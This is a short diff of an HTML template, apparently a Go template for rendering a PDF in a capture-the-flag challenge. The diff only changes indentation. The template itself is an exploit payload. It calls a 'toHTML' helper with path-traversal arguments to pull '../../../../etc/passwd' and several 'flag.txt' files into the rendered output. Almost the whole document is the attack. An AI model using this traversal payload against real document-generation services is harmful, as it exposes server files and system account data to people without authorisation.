@@ -1,21 +1,21 @@
 <!doctype html>
-     │ <html lang="en">
-     │   <head>
-     │     <meta charset="utf-8">
-     │     <title>My PDF</title>
-     │   </head>
-     │   <body>
-     │     <pre style="white-space: pre-wrap;">
-     │       Path:
-     │       {{ .DirPath }}  
-     │       PASSWD:
-     │       {{ toHTML .DirPath "../../../../etc/passwd" }}
-     │       IP:
-     │       {{ toHTML .DirPath "flag.txt" }}
-     │       TCP:
-     │       {{ toHTML .DirPath "../flag.txt" }}
-     │       env:
-     │       {{ toHTML .DirPath "../../flag.txt" }}
-     │     </pre>
-     │   </body>
-     │ </html>
+<html lang="en">
+  <head>
+    <meta charset="utf-8">
+    <title>My PDF</title>
+  </head>
+  <body>
+    <pre style="white-space: pre-wrap;">
+      Path:
+      {{ .DirPath }}  
+      PASSWD:
+      {{ toHTML .DirPath "../../../../etc/passwd" }}
+      IP:
+      {{ toHTML .DirPath "flag.txt" }}
+      TCP:
+      {{ toHTML .DirPath "../flag.txt" }}
+      env:
+      {{ toHTML .DirPath "../../flag.txt" }}
+    </pre>
+  </body>
+</html>
